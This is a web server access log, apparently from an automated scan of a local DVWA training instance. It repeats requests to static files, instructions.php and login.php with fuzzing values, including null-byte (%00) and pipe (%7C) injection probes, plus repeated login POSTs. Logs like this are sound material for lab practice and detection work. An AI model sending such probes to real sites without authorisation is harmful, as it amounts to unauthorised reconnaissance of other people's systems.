172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/main.css?query= HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images?= HTTP/1.1" 301 538 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/main.css?query=%40 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/?= HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/main.css?query=%2B HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images?query= HTTP/1.1" 301 548 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/main.css?query=%00 HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/?query= HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/css/main.css?query=%7C HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images?query=%40 HTTP/1.1" 301 554 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/?query=%40 HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images?query=%2B HTTP/1.1" 301 554 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/?query=%2B HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images?query=%00 HTTP/1.1" 301 554 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/?query=%00 HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images?query=%7C HTTP/1.1" 301 554 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/?query=%7C HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/login_logo.png HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/logo.png HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/login_logo.png?= HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/logo.png?= HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/login_logo.png?query= HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/logo.png?query= HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/login_logo.png?query=%40 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/logo.png?query=%40 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/logo.png?query=%2B HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/login_logo.png?query=%2B HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/logo.png?query=%00 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/login_logo.png?query=%00 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/logo.png?query=%7C HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:53 +0000] "GET /dvwa/images/login_logo.png?query=%7C HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/images/RandomStorm.png HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js HTTP/1.1" 301 545 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/images/RandomStorm.png?= HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/images/spanner.png HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/images/RandomStorm.png?query= HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/images/spanner.png?= HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/images/RandomStorm.png?query=%40 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/images/spanner.png?query= HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/images/spanner.png?query=%40 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/images/RandomStorm.png?query=%2B HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/images/spanner.png?query=%2B HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/images/RandomStorm.png?query=%00 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/images/spanner.png?query=%00 HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/images/RandomStorm.png?query=%7C HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/images/spanner.png?query=%7C HTTP/1.1" 200 693 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/ HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js?= HTTP/1.1" 301 530 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/?= HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js?query= HTTP/1.1" 301 540 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/add_event_listeners.js HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/?query= HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/add_event_listeners.js?= HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js?query=%40 HTTP/1.1" 301 546 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/add_event_listeners.js?query= HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/?query=%40 HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/add_event_listeners.js?query=%40 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js?query=%2B HTTP/1.1" 301 546 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/?query=%2B HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/add_event_listeners.js?query=%2B HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js?query=%00 HTTP/1.1" 301 546 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/?query=%00 HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js?query=%7C HTTP/1.1" 301 546 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/add_event_listeners.js?query=%00 HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/add_event_listeners.js?query=%7C HTTP/1.1" 200 858 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/?query=%7C HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/dvwaPage.js HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /favicon.ico HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/dvwaPage.js?= HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /favicon.ico?= HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/dvwaPage.js?query= HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /favicon.ico?query= HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/dvwaPage.js?query=%40 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /favicon.ico?query=%40 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/dvwaPage.js?query=%2B HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /favicon.ico?query=%2B HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/dvwaPage.js?query=%00 HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /favicon.ico?query=%00 HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /dvwa/js/dvwaPage.js?query=%7C HTTP/1.1" 200 1296 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /favicon.ico?query=%7C HTTP/1.1" 200 1651 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /instructions.php HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /instructions.php?doc=PHPIDS-license HTTP/1.1" 200 10862 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /instructions.php?= HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /instructions.php?= HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /instructions.php?query= HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /instructions.php?query=%40 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /instructions.php?doc= HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /instructions.php?query=%2B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /instructions.php?query=%00 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /instructions.php?doc=%40 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /instructions.php?query=%7C HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /instructions.php?doc=%2B HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /instructions.php?doc=%00 HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /instructions.php?doc=%7C HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /login.php?= HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "POST /login.php?= HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /login.php?query= HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "POST /login.php?query= HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:54 +0000] "GET /login.php?query=%40 HTTP/1.1" 200 1845 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php?query=%2B HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php?query=%40 HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php?query=%00 HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php?query=%7C HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "POST /login.php?query=%2B HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:55 +0000] "GET /login.php HTTP/1.1" 200 1864 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
